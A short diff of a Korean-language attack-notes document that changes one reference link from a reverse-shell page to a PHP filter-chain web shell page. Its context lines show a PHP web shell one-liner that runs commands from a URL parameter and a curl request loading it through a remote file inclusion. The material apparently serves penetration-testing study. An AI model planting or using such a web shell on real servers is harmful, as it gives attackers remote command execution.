@@ -34,7 +34,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 curl "http://target/upload/?file=http://127.0.0.1:8000/shell.php"
 ```
 
-- 이 시연은 [php_pipe](../../shells/reverse-shell/php_pipe.md) 문서를 참고한다.
+- 이 시연은 [php filter chain webshell](../../shells/web-shell/php_filter_chain_webshell.md) 문서를 참고한다.
 
 ## 참고 / 증적
 
